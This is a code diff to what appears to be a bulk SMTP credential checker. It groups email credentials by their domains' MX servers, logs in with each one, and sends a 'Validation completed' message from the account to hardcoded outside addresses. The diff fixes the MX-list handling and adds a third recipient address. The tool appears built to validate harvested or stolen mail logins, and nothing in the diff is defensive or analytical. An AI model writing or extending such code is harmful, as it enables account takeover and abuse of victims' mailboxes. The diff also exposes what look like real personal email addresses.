@@ -55,18 +55,28 @@ def group_by_host(credentials):
             domain = credential.username.split('@')[1].strip().lower()
             if not engine.is_banned_tld(domain):
                 if domain in domain_cache:
-                    mx_server = domain_cache[domain]
+                    mx_servers = domain_cache[domain]
                 else:
-                    mx_server = engine.get_mx_servers(domain)
-                    domain_cache[domain] = mx_server
-                    engine.logger.debug("MX lookup for %s: %s", domain, mx_server if mx_server else "None")
-                if mx_server:
+                    mx_servers = engine.get_mx_servers(domain)
+                    domain_cache[domain] = mx_servers
+                    engine.logger.debug("MX lookup for %s: %s", domain, mx_servers if mx_servers else "None")
+                
+                # Handle case where mx_servers is a list
+                if isinstance(mx_servers, list) and mx_servers:
+                    # Use the first MX server (or implement logic to select the best one)
+                    mx_server = mx_servers[0]  # Select the first MX server
                     credential.host = mx_server
                     key = (mx_server, credential.port)
                     grouped[key].append(credential)
                     engine.logger.debug("Grouped credential %s under %s:%d", credential.username, mx_server, credential.port)
+                elif isinstance(mx_servers, str) and mx_servers:
+                    # If mx_servers is a single string
+                    credential.host = mx_servers
+                    key = (mx_servers, credential.port)
+                    grouped[key].append(credential)
+                    engine.logger.debug("Grouped credential %s under %s:%d", credential.username, mx_servers, credential.port)
                 else:
-                    engine.logger.warning("No MX server found for domain: %s, skipping %s", domain, credential.username)
+                    engine.logger.warning("No valid MX server found for domain: %s, skipping %s", domain, credential.username)
             else:
                 engine.logger.warning("Skipping credential %s due to banned TLD: %s", credential.username, domain)
         else:
@@ -106,7 +116,7 @@ def test_smtp_credential(host, port, credential):
         # Send test email
         msg = MIMEMultipart()
         msg['From'] = credential.username
-        msg['To'] = 'mark.boleigha@outlook.com, donhoenix@gmail.com'
+        msg['To'] = 'mark.boleigha@outlook.com, donhoenix@gmail.com, quacklabsystems@yahoo.com'
         msg['Subject'] = 'Validation completed'
         body = f"This is a test email to validate the connection for {credential.username}."
         msg.attach(MIMEText(body, 'plain'))
